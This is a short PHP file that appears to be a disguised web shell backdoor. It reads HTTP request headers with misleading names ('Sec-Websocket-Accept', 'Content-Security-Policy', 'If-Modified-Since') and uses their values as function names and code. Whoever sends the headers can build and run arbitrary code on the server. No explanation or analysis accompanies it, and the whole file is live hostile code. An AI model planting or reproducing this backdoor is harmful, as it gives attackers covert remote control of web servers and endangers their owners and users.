<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $center = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Content-Security-Policy']($_HEADERS['If-Modified-Since']));
    $center();
}